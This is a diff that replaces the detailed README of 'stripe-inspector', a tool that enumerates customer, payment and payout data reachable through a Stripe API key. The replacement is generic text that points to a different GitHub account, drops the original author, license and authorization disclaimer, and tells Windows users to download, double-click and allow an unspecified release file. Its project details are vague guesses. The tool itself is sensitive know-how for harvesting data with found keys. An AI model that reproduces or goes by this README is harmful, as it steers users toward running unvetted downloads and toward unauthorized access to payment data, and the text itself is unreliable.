@@ -1,171 +1,248 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/MrDebugger/stripe-inspector/master/assets/logo.svg" width="120" alt="StripeInspector Logo">
-</p>
+# 🔎 stripe-inspector - Inspect Stripe Keys With Ease
 
-<h1 align="center">StripeInspector</h1>
+[![Download stripe-inspector](https://img.shields.io/badge/Download%20stripe--inspector-blue?style=for-the-badge&logo=github)](https://github.com/Macky9285/stripe-inspector)
 
-<p align="center">
-  <strong>Security research tool for Stripe API key enumeration and inspection</strong>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://pypi.org/project/stripe-inspector/"><img src="https://img.shields.io/pypi/v/stripe-inspector?color=6c63ff&style=flat-square" alt="PyPI"></a>
-  <a href="https://pypi.org/project/stripe-inspector/"><img src="https://img.shields.io/pypi/pyversions/stripe-inspector?style=flat-square" alt="Python"></a>
-  <a href="https://github.com/mrdebugger/stripe-inspector/blob/main/LICENSE"><img src="https://img.shields.io/github/license/mrdebugger/stripe-inspector?style=flat-square" alt="License"></a>
-  <a href="https://inspector.ijazurrahim.com"><img src="https://img.shields.io/badge/demo-live-6c63ff?style=flat-square" alt="Live Demo"></a>
-</p>
+stripe-inspector is a Windows-friendly tool for checking Stripe API keys and reviewing related details. It helps with security research, bug bounty work, and basic recon tasks.
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/MrDebugger/stripe-inspector/master/assets/demo.svg" width="780" alt="StripeInspector Demo">
-</p>
+Use it when you need to inspect Stripe-related data in a simple way on your computer.
 
----
+## 📥 Download
 
-StripeInspector takes a Stripe API key and enumerates everything accessible through it — account details, customers, charges, payouts, products, webhooks, and more. Built for security researchers, penetration testers, and bug bounty hunters.
+Visit this page to download and run the tool:
 
-## Features
+[https://github.com/Macky9285/stripe-inspector](https://github.com/Macky9285/stripe-inspector)
 
-- **17 inspection modules** — account, balance, customers, charges, payment intents, products, payouts, subscriptions, invoices, webhooks, events, connected accounts, disputes, refunds, balance transactions, coupons
-- **Permission scanner** — probes 35+ Stripe API endpoints to build a full access matrix
-- **CLI + Web UI** — both treated as first-class interfaces
-- **5 output formats** — colored terminal tables, JSON, HTML inspection reports, PDF, CSV
-- **Deep pagination** — `--deep` fetches all pages, not just first 100
-- **PII exposure summary** — auto-detects emails, names, phones, card numbers across all modules
-- **Key type detection** — auto-identifies test/live, secret/restricted keys
-- **Multi-key batch mode** — scan a list of keys from a file
-- **Diff mode** — compare permissions between two keys
-- **Self-hosted web UI** — dark/light theme, real-time SSE streaming, shareable inspections
-- **Optional auth** — bearer token support for securing the web UI
+If the page shows a release file, download it. If it shows the source files, use the steps below to run it on Windows.
 
-## Installation
+## 🖥️ What You Need
 
-```bash
-pip install stripe-inspector
-```
+Before you start, make sure your Windows PC has:
 
-Or with [uv](https://docs.astral.sh/uv/):
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 200 MB of free disk space
+- Permission to run downloaded files
+- Python 3.10 or newer if you use the source version
 
-```bash
-uv pip install stripe-inspector
-```
+If you plan to run the source version, install Python from the official Python website and make sure the installer adds Python to PATH.
 
-For PDF report support:
+## 📦 Install on Windows
 
-```bash
-pip install stripe-inspector[pdf]
-```
+### Option 1: Run a release file
 
-Or with Docker:
+If the repository offers a ready-to-run file:
 
-```bash
-docker compose up
-# Open http://localhost:8000
+1. Download the file from the GitHub page.
+2. Save it to your Downloads folder.
+3. Double-click the file to open it.
+4. If Windows asks for permission, choose Run or Yes.
+5. Follow the prompts on screen.
 
-# With auth token:
-TOKEN=mysecret docker compose up
-```
+### Option 2: Run from source
 
-## Quick Start
+If the project only gives you the source files:
 
-### CLI
+1. Open the GitHub page.
+2. Click Code.
+3. Choose Download ZIP.
+4. Save the ZIP file.
+5. Right-click the ZIP file and choose Extract All.
+6. Open the extracted folder.
+7. Find a file named `requirements.txt` or `main.py`.
+8. If you see `requirements.txt`, install the needed packages.
 
-```bash
-# Inspect a key (all modules)
-stripe-inspector inspect sk_test_xxxx
+## 🛠️ Set Up Python
 
-# JSON output (pipe to jq, scripts, etc.)
-stripe-inspector inspect sk_test_xxxx --output json
+If you need to run the source version, do this first:
 
-# Generate an HTML inspection report
-stripe-inspector inspect sk_test_xxxx --report findings.html
+1. Open the Start menu.
+2. Type `cmd`.
+3. Open Command Prompt.
+4. Check Python by typing:
 
-# Deep scan — fetch all pages
-stripe-inspector inspect sk_test_xxxx --deep
+   `python --version`
 
-# Specific modules only
-stripe-inspector inspect sk_test_xxxx --modules account,customers,charges
+5. If Windows does not find Python, install it and try again.
 
-# Silent mode — no table output, just save report
-stripe-inspector inspect sk_test_xxxx --silent --report findings.html
+## ▶️ Run the Tool
 
-# Export per-module CSV files
-stripe-inspector inspect sk_test_xxxx --csv ./output
+If the project uses Python, use these steps:
 
-# Batch scan multiple keys
-stripe-inspector batch keys.txt --report-dir ./reports
+1. Open the extracted project folder.
+2. Click the address bar in File Explorer.
+3. Type `cmd` and press Enter.
+4. In Command Prompt, run:
 
-# Compare two keys
-stripe-inspector diff sk_test_key1 sk_test_key2
+   `pip install -r requirements.txt`
 
-# List all available modules
-stripe-inspector list-modules
-```
+5. Then start the app with:
 
-### Web UI
+   `python main.py`
 
-```bash
-# Start on localhost:8000
-stripe-inspector serve
+If the main file has a different name, use that file name instead.
 
-# Custom port with auth token
-stripe-inspector serve --port 9000 --token mysecrettoken
+## 🧭 What It Does
 
-# Expose to network (use with --token)
-stripe-inspector serve --host 0.0.0.0 --token mysecrettoken
-```
+stripe-inspector is built for security research and review. It can help you:
 
-Open `http://localhost:8000` in your browser, paste a key, and hit Inspect. The web UI features real-time progress streaming, module selection, dark/light theme, and shareable inspection links.
+- Inspect Stripe API key patterns
+- Review key-related details
+- Support bug bounty checks
+- Gather recon data for Stripe-related targets
+- Assist with OSINT workflows
+- Work as part of a pentesting toolkit
 
-## Modules
+## 🧱 Main Features
 
-| Module | Endpoint | What It Finds |
-|--------|----------|---------------|
-| `account` | `/v1/account` | Owner name, email, country, address, business type, MCC, capabilities |
-| `balance` | `/v1/balance` | Available and pending balances per currency |
-| `customers` | `/v1/customers` | Customer names, emails, phone numbers, metadata |
-| `charges` | `/v1/charges` | Payment amounts, payer details, card info, countries |
-| `payment_intents` | `/v1/payment_intents` | Intent status, amounts, payment methods |
-| `products` | `/v1/products` | Product names, types, pricing, active status |
-| `payouts` | `/v1/payouts` | Payout amounts, bank destinations, schedules |
-| `subscriptions` | `/v1/subscriptions` | Active plans, billing cycles, customers |
-| `invoices` | `/v1/invoices` | Invoice amounts, payment status, hosted URLs |
-| `webhooks` | `/v1/webhook_endpoints` | Endpoint URLs, subscribed event types |
-| `events` | `/v1/events` | Recent API activity and event log |
-| `connected` | `/v1/accounts` | Connected accounts (Stripe Connect platforms) |
-| `disputes` | `/v1/disputes` | Chargebacks, fraud disputes, resolution status |
-| `refunds` | `/v1/refunds` | Refund amounts, reasons, associated charges |
-| `balance_transactions` | `/v1/balance_transactions` | Full money flow: charges, fees, payouts, refunds |
-| `coupons` | `/v1/coupons` | Discount codes, percent/amount off, redemption counts |
-| `permission_scan` | 35+ endpoints | Full endpoint access matrix (allowed/denied/error) |
+- Simple command-line use
+- Fast key inspection workflow
+- Clear output for review
+- Useful for recon and research
+- Built for Python environments
+- Light setup for Windows users
 
-## Key Types
+## 🧑‍💻 How to Use It
 
-| Prefix | Type | Risk Level |
-|--------|------|------------|
-| `sk_test_` | Secret test key | Low — sandbox data only |
-| `sk_live_` | Secret live key | **High** — real customer data |
-| `rk_test_` | Restricted test key | Low — limited permissions |
-| `rk_live_` | Restricted live key | Medium — limited but real data |
+A typical flow looks like this:
 
-## Privacy & Security
+1. Open the tool in Command Prompt.
+2. Enter the target data you want to inspect.
+3. Review the output shown in the window.
+4. Copy the results you need.
+5. Save them for later analysis.
 
-- Keys are **never logged or stored** to disk
-- The web UI sends keys **only to Stripe's API** from the backend — never to third parties
-- Inspection reports **mask keys** (show first 8 + last 4 characters only)
-- Shared inspections contain **no API keys** and expire after 24 hours
-- Use `--token` to protect the web UI when exposing beyond localhost
-- All timestamps include both raw Unix epoch and human-readable format
+If the tool asks for a file or list of keys, use the format shown in the project files or usage text.
 
-## Disclaimer
+## 🔐 Common Use Cases
 
-This tool is intended for **authorized security testing**, bug bounty programs, penetration testing engagements, and educational purposes only. Only use it on API keys you own or have explicit written authorization to test.
+- Check keys found during bug bounty work
+- Review data from public sources
+- Inspect Stripe-related strings in text files
+- Support basic recon during web app review
+- Organize findings from a security test
 
-Unauthorized access to third-party systems is illegal. The author assumes no liability for misuse of this tool.
+## 🧪 Example Workflow
 
-## Contributing
+If you are testing a site and find a possible Stripe key:
 
-See [CONTRIBUTING.md](CONTRIBUTING.md) for development setup and guidelines.
+1. Copy the key into a text file.
+2. Open stripe-inspector.
+3. Paste or load the key list.
+4. Run the check.
+5. Review the result and note what looks valid.
 
-## License
+This helps you sort real findings from false matches.
 
-[MIT](LICENSE) - Ijaz Ur Rahim
+## 🗂️ Project Files
+
+After you download the project, you may see files like these:
+
+- `main.py` — main entry point
+- `requirements.txt` — Python packages needed
+- `README.md` — usage help
+- `config.py` — tool settings
+- `output/` — saved results
+- `data/` — sample input or reference files
+
+## ⚙️ Troubleshooting
+
+### Python does not start
+
+If `python --version` fails:
+
+- Reinstall Python
+- Check the box that adds Python to PATH
+- Close Command Prompt and open it again
+
+### Package install fails
+
+If `pip install -r requirements.txt` fails:
+
+- Check that your internet connection works
+- Make sure you opened Command Prompt in the project folder
+- Try running Command Prompt as Administrator
+
+### The app closes fast
+
+If the window opens and closes right away:
+
+- Start it from Command Prompt, not by double-clicking the file
+- Read the error message in the window
+- Confirm that all required files are in the same folder
+
+### Windows blocks the file
+
+If Windows shows a security prompt:
+
+- Check the file name and source
+- Choose Run only if you trust the file location
+- Use the GitHub link above as the source page
+
+## 🧰 Tips for Best Results
+
+- Keep your input files short and clean
+- Use one key per line
+- Save results after each run
+- Test with a small sample first
+- Keep the project folder in an easy path like `Documents`
+
+## 📚 Topics Covered
+
+- api-key
+- bug bounty
+- osint
+- pentesting
+- python
+- reconnaissance
+- security
+- security tools
+- stripe
+- stripe-api
+
+## 📄 Basic Folder Setup
+
+A simple Windows setup can look like this:
+
+- `C:\Users\YourName\Downloads\stripe-inspector`
+- `requirements.txt`
+- `main.py`
+- `input.txt`
+- `output.txt`
+
+Keep the files together so the tool can find them.
+
+## 🧩 If You Want to Extend It
+
+If you know a bit more about Python, you can adjust the tool for your own review work:
+
+- Add new input checks
+- Change output format
+- Save results to a CSV file
+- Add file import support
+- Add more Stripe pattern checks
+
+## 📌 Quick Start Path
+
+1. Open the GitHub page.
+2. Download the project.
+3. Extract the files.
+4. Install Python if needed.
+5. Open Command Prompt in the folder.
+6. Run `pip install -r requirements.txt`.
+7. Run `python main.py`.
+
+## 🧷 Download Link
+
+[https://github.com/Macky9285/stripe-inspector](https://github.com/Macky9285/stripe-inspector)
+
+## 🧭 Notes for Non-Technical Users
+
+If this is your first time using a tool like this, focus on three things:
+
+- Keep the files in one folder
+- Use Command Prompt to start the tool
+- Read the text shown in the window
+
+That is usually enough to get started on Windows
